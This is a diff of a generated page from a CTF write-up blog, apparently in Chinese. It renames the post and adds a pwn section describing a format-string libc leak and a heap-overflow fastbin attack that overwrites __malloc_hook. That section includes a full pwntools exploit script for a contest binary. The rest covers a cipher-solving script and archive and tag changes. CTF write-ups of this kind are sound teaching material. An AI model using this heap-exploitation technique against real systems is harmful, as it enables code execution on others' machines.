@@ -11,11 +11,11 @@
     <meta name="author" content="Tianji">
     <meta name="renderer" content="webkit">
     <meta name="copyright" content="Tianji">
-    <meta name="keywords" content="anheng9 | Tianji">
+    <meta name="keywords" content="anheng | Tianji">
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>anheng9 · Tianji&#39;s Blog</title>
+    <title>anheng · Tianji&#39;s Blog</title>
     <!-- 设置密码 -->
     <script>
         (function(){
@@ -221,7 +221,7 @@
                 <a href="/">Tianji&#39;s Blog.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">anheng9</a>
+                <a href="#" class="post-name">anheng</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            anheng9
+            anheng
             <!-- 404 -->
             
         </h1>
@@ -267,7 +267,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">563</span> / Reading time: <span class="post-count">3 min</span></span>
+                        <span>Word count: <span class="post-count">935</span> / Reading time: <span class="post-count">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -402,7 +402,17 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ilnllliiikkninlekile</span><br></pre></td></tr></table></figure>
 <p>解密脚本:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">key = []</span><br><span class="line">cipher = <span class="string">"ilnllliiikkninlekile"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(<span class="string">'ilnke'</span>, <span class="number">5</span>):</span><br><span class="line">    key.append(<span class="string">''</span>.join(i))</span><br><span class="line"><span class="keyword">for</span> now_key <span class="keyword">in</span> key:</span><br><span class="line">    solve_c = <span class="string">""</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> now_c <span class="keyword">in</span> cipher:</span><br><span class="line">        solve_c += str(now_key.index(now_c))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(solve_c),<span class="number">2</span>):</span><br><span class="line">        now_ascii = int(solve_c[i])*<span class="number">5</span>+int(solve_c[i+<span class="number">1</span>])+<span class="number">97</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"now_ascii:"</span>, now_ascii, chr(now_ascii)</span><br><span class="line">        <span class="keyword">if</span> now_ascii &gt; ord(<span class="string">'i'</span>):</span><br><span class="line">            now_ascii += <span class="number">1</span></span><br><span class="line">        res += chr(now_ascii)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">print</span> now_key,res</span><br></pre></td></tr></table></figure>
-<h1 id="NewDriver"><a href="#NewDriver" class="headerlink" title="NewDriver"></a>NewDriver</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">key=[0x66, 0x32, 0xCA, 0xA0, 0xBF, 0x98, 0x2D, 0x76, 0xF1, 0x59, 0x2A, 0x4A, 0xF4, 0x30, 0xAD, 0xD2, 0x1D, 0x02, 0xD8, 0x23, 0x89, 0x5D, 0x83, 0x38, 0x09, 0xF2, 0x74, 0x65, 0x40, 0x19, 0xC6, 0xDD, 0x18, 0xD3, 0x8F, 0x6C, 0x8B, 0xC0, 0xC5, 0x54, 0x2E, 0x81, 0x10, 0xC4, 0x26, 0x56, 0x5F, 0x53, 0x80, 0x43, 0x27, 0x62, 0xEA, 0x3D, 0xE6, 0x00, 0xE7, 0xB7, 0x50, 0x94, 0x90, 0x4C, 0x3F, 0x9D, 0x07, 0xE0, 0xA3, 0x9C, 0x4E, 0x0F, 0x9F, 0xFE, 0x5B, 0x8E, 0xDE, 0x88, 0x72, 0x2F, 0xC1, 0x67, 0x31, 0x70, 0x8D, 0xFD, 0xBE, 0x64, 0xC3, 0xBD, 0x6B, 0x7A, 0xCF, 0x0C, 0x34, 0x1F, 0x6F, 0x01, 0xF0, 0x7C, 0x5E, 0xA4, 0x1E, 0x49, 0x8C, 0x75, 0x1C, 0xE3, 0x20, 0x48, 0x28, 0x79, 0xA5, 0x7F, 0xF5, 0xEC, 0x4F, 0x78, 0x58, 0x11, 0xF7, 0xCD, 0x91, 0x13, 0xFC, 0xB8, 0x2C, 0x04, 0xEE, 0xD5, 0x08, 0x44, 0xA9, 0xE1, 0xB1, 0x42, 0x84, 0x29, 0xA7, 0x47, 0x97, 0x7E, 0xE8, 0xB3, 0x60, 0x0B, 0xF9, 0x4B, 0x3C, 0x77, 0x17, 0x03, 0x82, 0x69, 0x87, 0xD4, 0x95, 0x1A, 0x33, 0x25, 0x6E, 0xCC, 0xD6, 0xBB, 0x99, 0xB0, 0x85, 0x41, 0xB2, 0x0D, 0xDB, 0x35, 0x3B, 0x5C, 0xF8, 0xED, 0x9E, 0xA6, 0x96, 0x39, 0x63, 0x0A, 0x1B, 0x93, 0x21, 0x46, 0x12, 0xD0, 0xB4, 0x22, 0x51, 0xC9, 0x61, 0xD1, 0x2B, 0xAA, 0x45, 0x06, 0x05, 0xCE, 0xFA, 0x92, 0x68, 0xAB, 0x36, 0xDA, 0xC8, 0xE2, 0x37, 0xD9, 0xA2, 0x5A, 0xD7, 0x6A, 0xB5, 0xFF, 0xE9, 0xBA, 0x52, 0x15, 0xF6, 0xBC, 0x9A, 0xB6, 0xEF, 0x6D, 0xCB, 0x4D, 0xAE, 0xE4, 0xA1, 0xAC, 0xEB, 0x0E, 0x71, 0x7B, 0xF3, 0x24, 0xC2, 0xFB, 0x7D, 0x86, 0x55, 0xAF, 0x3A, 0xDF, 0x3E, 0x14, 0xB9, 0x9B, 0x16, 0xDC, 0x73, 0x57, 0xE5, 0xC7, 0x8A, 0xA8, 0x66, 0x6C, 0x61, 0x67, 0x7B, 0x74, 0x68, 0x69, 0x73, 0x5F, 0x69, 0x73, 0x5F, 0x6E, 0x6F, 0x74, 0x5F, 0x74, 0x68, 0x65, 0x5F, 0x66, 0x6C, 0x61, 0x67, 0x5F, 0x68, 0x61, 0x68, 0x61, 0x68, 0x61, 0x7D]</span><br><span class="line">key2=[0x20, 0xC3, 0x1A, 0xAE, 0x97, 0x3C, 0x7A, 0x41, 0xDE, 0xF6, 0x78, 0x15, 0xCB, 0x4B, 0x4C, 0xDC, 0x26, 0x55, 0x8B, 0x55, 0xE5, 0xE9, 0x55, 0x75, 0x40, 0x3D, 0x82, 0x13, 0xA5, 0x60, 0x13, 0x3B, 0xF5, 0xD8, 0x19, 0x0E, 0x47, 0xCF, 0x5F, 0x5E, 0xDE, 0x9D, 0x14, 0xBD]</span><br><span class="line"></span><br><span class="line">for v3 in range(44):</span><br><span class="line">  v3+=1</span><br><span class="line">  v6=key[v3]</span><br><span class="line">  v4=(v6+v4)%256</span><br><span class="line">  key[v3]=key[v4]</span><br><span class="line">  key[v4]=v6</span><br><span class="line">  key3.append(key[(key[v3]+v6)%256])</span><br><span class="line">for i in range(44):</span><br><span class="line">  key2[i]^=key3[i]</span><br><span class="line">for i in key2:</span><br><span class="line">  s+=chr(i)</span><br><span class="line"></span><br><span class="line">print s</span><br><span class="line">data = s</span><br><span class="line"></span><br><span class="line">mima   = &quot;ABCDEFGHIJSTUVWKLMNOPQRXYZabcdqrstuvwxefghijklmnopyz0123456789+/&quot;</span><br><span class="line">common = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><span class="line"></span><br><span class="line">data = &quot;ZeptZ3l5UHQra25nd19yYzMrYR5wX2Jtc2P2VF9gYNM9&quot;</span><br><span class="line"></span><br><span class="line">data1 = &quot;&quot;</span><br><span class="line">for i in data:</span><br><span class="line">    data1 += common[mima.index(i)]</span><br><span class="line"></span><br><span class="line">print data1</span><br></pre></td></tr></table></figure>
+<h2 id="NewDriver"><a href="#NewDriver" class="headerlink" title="NewDriver"></a>NewDriver</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">key=[0x66, 0x32, 0xCA, 0xA0, 0xBF, 0x98, 0x2D, 0x76, 0xF1, 0x59, 0x2A, 0x4A, 0xF4, 0x30, 0xAD, 0xD2, 0x1D, 0x02, 0xD8, 0x23, 0x89, 0x5D, 0x83, 0x38, 0x09, 0xF2, 0x74, 0x65, 0x40, 0x19, 0xC6, 0xDD, 0x18, 0xD3, 0x8F, 0x6C, 0x8B, 0xC0, 0xC5, 0x54, 0x2E, 0x81, 0x10, 0xC4, 0x26, 0x56, 0x5F, 0x53, 0x80, 0x43, 0x27, 0x62, 0xEA, 0x3D, 0xE6, 0x00, 0xE7, 0xB7, 0x50, 0x94, 0x90, 0x4C, 0x3F, 0x9D, 0x07, 0xE0, 0xA3, 0x9C, 0x4E, 0x0F, 0x9F, 0xFE, 0x5B, 0x8E, 0xDE, 0x88, 0x72, 0x2F, 0xC1, 0x67, 0x31, 0x70, 0x8D, 0xFD, 0xBE, 0x64, 0xC3, 0xBD, 0x6B, 0x7A, 0xCF, 0x0C, 0x34, 0x1F, 0x6F, 0x01, 0xF0, 0x7C, 0x5E, 0xA4, 0x1E, 0x49, 0x8C, 0x75, 0x1C, 0xE3, 0x20, 0x48, 0x28, 0x79, 0xA5, 0x7F, 0xF5, 0xEC, 0x4F, 0x78, 0x58, 0x11, 0xF7, 0xCD, 0x91, 0x13, 0xFC, 0xB8, 0x2C, 0x04, 0xEE, 0xD5, 0x08, 0x44, 0xA9, 0xE1, 0xB1, 0x42, 0x84, 0x29, 0xA7, 0x47, 0x97, 0x7E, 0xE8, 0xB3, 0x60, 0x0B, 0xF9, 0x4B, 0x3C, 0x77, 0x17, 0x03, 0x82, 0x69, 0x87, 0xD4, 0x95, 0x1A, 0x33, 0x25, 0x6E, 0xCC, 0xD6, 0xBB, 0x99, 0xB0, 0x85, 0x41, 0xB2, 0x0D, 0xDB, 0x35, 0x3B, 0x5C, 0xF8, 0xED, 0x9E, 0xA6, 0x96, 0x39, 0x63, 0x0A, 0x1B, 0x93, 0x21, 0x46, 0x12, 0xD0, 0xB4, 0x22, 0x51, 0xC9, 0x61, 0xD1, 0x2B, 0xAA, 0x45, 0x06, 0x05, 0xCE, 0xFA, 0x92, 0x68, 0xAB, 0x36, 0xDA, 0xC8, 0xE2, 0x37, 0xD9, 0xA2, 0x5A, 0xD7, 0x6A, 0xB5, 0xFF, 0xE9, 0xBA, 0x52, 0x15, 0xF6, 0xBC, 0x9A, 0xB6, 0xEF, 0x6D, 0xCB, 0x4D, 0xAE, 0xE4, 0xA1, 0xAC, 0xEB, 0x0E, 0x71, 0x7B, 0xF3, 0x24, 0xC2, 0xFB, 0x7D, 0x86, 0x55, 0xAF, 0x3A, 0xDF, 0x3E, 0x14, 0xB9, 0x9B, 0x16, 0xDC, 0x73, 0x57, 0xE5, 0xC7, 0x8A, 0xA8, 0x66, 0x6C, 0x61, 0x67, 0x7B, 0x74, 0x68, 0x69, 0x73, 0x5F, 0x69, 0x73, 0x5F, 0x6E, 0x6F, 0x74, 0x5F, 0x74, 0x68, 0x65, 0x5F, 0x66, 0x6C, 0x61, 0x67, 0x5F, 0x68, 0x61, 0x68, 0x61, 0x68, 0x61, 0x7D]</span><br><span class="line">key2=[0x20, 0xC3, 0x1A, 0xAE, 0x97, 0x3C, 0x7A, 0x41, 0xDE, 0xF6, 0x78, 0x15, 0xCB, 0x4B, 0x4C, 0xDC, 0x26, 0x55, 0x8B, 0x55, 0xE5, 0xE9, 0x55, 0x75, 0x40, 0x3D, 0x82, 0x13, 0xA5, 0x60, 0x13, 0x3B, 0xF5, 0xD8, 0x19, 0x0E, 0x47, 0xCF, 0x5F, 0x5E, 0xDE, 0x9D, 0x14, 0xBD]</span><br><span class="line"></span><br><span class="line">for v3 in range(44):</span><br><span class="line">  v3+=1</span><br><span class="line">  v6=key[v3]</span><br><span class="line">  v4=(v6+v4)%256</span><br><span class="line">  key[v3]=key[v4]</span><br><span class="line">  key[v4]=v6</span><br><span class="line">  key3.append(key[(key[v3]+v6)%256])</span><br><span class="line">for i in range(44):</span><br><span class="line">  key2[i]^=key3[i]</span><br><span class="line">for i in key2:</span><br><span class="line">  s+=chr(i)</span><br><span class="line"></span><br><span class="line">print s</span><br><span class="line">data = s</span><br><span class="line"></span><br><span class="line">mima   = &quot;ABCDEFGHIJSTUVWKLMNOPQRXYZabcdqrstuvwxefghijklmnopyz0123456789+/&quot;</span><br><span class="line">common = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><span class="line"></span><br><span class="line">data = &quot;ZeptZ3l5UHQra25nd19yYzMrYR5wX2Jtc2P2VF9gYNM9&quot;</span><br><span class="line"></span><br><span class="line">data1 = &quot;&quot;</span><br><span class="line">for i in data:</span><br><span class="line">    data1 += common[mima.index(i)]</span><br><span class="line"></span><br><span class="line">print data1</span><br></pre></td></tr></table></figure>
+<h2 id="安恒10月-pwn-leak"><a href="#安恒10月-pwn-leak" class="headerlink" title="安恒10月 pwn - leak"></a>安恒10月 pwn - leak</h2><ul>
+<li>通过格式化字符串漏洞泄露libc</li>
+<li>通过堆溢出</li>
+</ul>
+<p>首先通过堆溢出，修改top chunk 的size字段，将top chunk送入unsorted bin，参考house_of_orange前半部分</p>
+<p>然后通过堆溢出，修改top chunk 的size字段，将新的top chunk送入fast bin，参考house_of_orange前半部分</p>
+<p>接着，将unsorted bin中的top chunk申请出来，通过溢出，来构造fast bin链</p>
+<p>连续申请两次fast bin，然后即可修改 _malloc_hook的值。</p>
+<p>exp来自某不知道名字的大佬。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">#context.log_level=True</span><br><span class="line">elf=ELF(&apos;level1&apos;)</span><br><span class="line">libc=ELF(&apos;libc.so.6&apos;)</span><br><span class="line">p=process(&apos;./level1&apos;)</span><br><span class="line">#p=remote(&apos;101.71.29.5&apos;,10012)</span><br><span class="line">def create(x,y):</span><br><span class="line">    p.recvuntil(&apos;3:exit\n&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;size: &apos;)</span><br><span class="line">    p.sendline(str(x))</span><br><span class="line">    p.recvuntil(&apos;string: &apos;)</span><br><span class="line">    p.sendline(y)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    p.recvuntil(&apos;3:exit\n&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;result: &apos;)</span><br><span class="line">    </span><br><span class="line">def pwn():</span><br><span class="line">    create(0xaf0,&apos;%13$lx&apos;)</span><br><span class="line">    show()</span><br><span class="line">    libc_start_main=int(p.recv(12),16)-0xf0</span><br><span class="line">    </span><br><span class="line">    print hex(libc_start_main)</span><br><span class="line">    libcbase=libc_start_main-0x0020740</span><br><span class="line">    print hex(libcbase)</span><br><span class="line"></span><br><span class="line">    mallochook=libcbase+0x3c4b10</span><br><span class="line">    print &quot;mallochook&quot;, hex(mallochook)</span><br><span class="line"></span><br><span class="line">    create(0x3c0,&apos;b&apos;*0x3c0+p64(0)+p64(0x131))</span><br><span class="line"></span><br><span class="line">    one=libcbase+0xf1147            </span><br><span class="line"></span><br><span class="line">    # unsorted_bin exist</span><br><span class="line">    create(0xcf0,&apos;a&apos;) # this chunk will be in the second page</span><br><span class="line">    create(0x260,&apos;b&apos;*0x260+p64(0)+p64(0x91))</span><br><span class="line">    # over 0x564c6bf0bf70</span><br><span class="line"></span><br><span class="line">    # fast_bin exist</span><br><span class="line">    create(0x200,&apos;ddd&apos;) # this chunk will be in the third page</span><br><span class="line">    </span><br><span class="line">    # add malloc_hook to fastbin</span><br><span class="line">    create(0x100,&apos;d&apos;*0x21090+p64(0)+p64(0x71)+p64(mallochook-0x13))</span><br><span class="line">    </span><br><span class="line">    attach(p)</span><br><span class="line">    create(0x60,&apos;a&apos;)</span><br><span class="line">    </span><br><span class="line">    create(0x60, &quot;aaa&quot; + p64(one))</span><br><span class="line">    </span><br><span class="line">    p.recvuntil(&apos;3:exit\n&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;size: &apos;)</span><br><span class="line">    p.sendline(&apos;20&apos;)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
 
     </article>
     <!-- license  -->
@@ -541,8 +551,8 @@
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#babypass"><span class="toc-number">1.</span> <span class="toc-text">babypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#go-md5你找到的字符串"><span class="toc-number">2.</span> <span class="toc-text">go(md5你找到的字符串)</span></a></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#NewDriver"><span class="toc-number"></span> <span class="toc-text">NewDriver</span></a>
-    </li></div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#babypass"><span class="toc-number">1.</span> <span class="toc-text">babypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#go-md5你找到的字符串"><span class="toc-number">2.</span> <span class="toc-text">go(md5你找到的字符串)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NewDriver"><span class="toc-number">3.</span> <span class="toc-text">NewDriver</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#安恒10月-pwn-leak"><span class="toc-number">4.</span> <span class="toc-text">安恒10月 pwn - leak</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1389,9 +1399,261 @@
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 57
+        Total : 71
         </div>
         <!-- search  -->
         
@@ -1402,8 +1664,97 @@
     
     
     
+    <div class="archive-year"> 2099 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href="/posts/30918/">day-day-up</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/31116/">ctf题目-php调试分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/36891/">php7.2内核调试环境搭建</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/04</span><a class="archive-post-title" href="/posts/46756/">linux-优化实战笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/02</span><a class="archive-post-title" href="/posts/41159/">RealWorldFinal</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href="/posts/4968/">pwnable.tw练习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/29</span><a class="archive-post-title" href="/posts/48844/">bctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/59263/">安全设备名词解释</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/23961/">安全域划分的相关问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href="/posts/16617/">code-breaking</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span><a class="archive-post-title" href="/posts/3376/">lctf-2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/16</span><a class="archive-post-title" href="/posts/62306/">babystack-ret2dlsolve</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span><a class="archive-post-title" href="/posts/49484/">hctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/04</span><a class="archive-post-title" href="/posts/59104/">SROP-study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/19071/">tcache-study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/54250/">house_of_roman</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1413,11 +1764,6 @@
     
         <li class="archive-post-item">
             <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/posts/30021/">hack-lu</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/posts/15111/">护网杯pwn-study</a>
         </li>
     
     
@@ -1437,7 +1783,7 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/22</span><a class="archive-post-title" href="/posts/45708/">anheng9</a>
+            <span class="archive-post-date">09/22</span><a class="archive-post-title" href="/posts/45708/">anheng</a>
         </li>
     
     
@@ -1557,17 +1903,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/posts/29914/">ssrf+gopher</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">06/26</span><a class="archive-post-title" href="/posts/22546/">googlectf2018</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/24</span><a class="archive-post-title" href="/posts/9490/">proc的作用</a>
+            <span class="archive-post-date">06/24</span><a class="archive-post-title" href="/posts/9490/">linux常见文件的作用</a>
         </li>
     
     
@@ -1612,12 +1953,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
         </li>
     
     
@@ -1637,7 +1978,7 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/posts/32791/">bypassaslr_1</a>
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/posts/32791/">bypassaslr_return2plt</a>
         </li>
     
     
@@ -1695,19 +2036,25 @@
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
         <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
     
         <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
     
-        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+        <span class="sidebar-tag-name" data-tags="ctf_php_debug"><span class="iconfont-archer">&#xe606;</span>ctf_php_debug</span>
     
         <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
     
+        <span class="sidebar-tag-name" data-tags="置顶"><span class="iconfont-archer">&#xe606;</span>置顶</span>
+    
         <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
+    
+        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
     
         <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
     
-        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
+        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
@@ -1719,9 +2066,9 @@
     
         <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
     
-        <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
+        <span class="sidebar-tag-name" data-tags="安全体系建设"><span class="iconfont-archer">&#xe606;</span>安全体系建设</span>
     
-        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+        <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
     
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
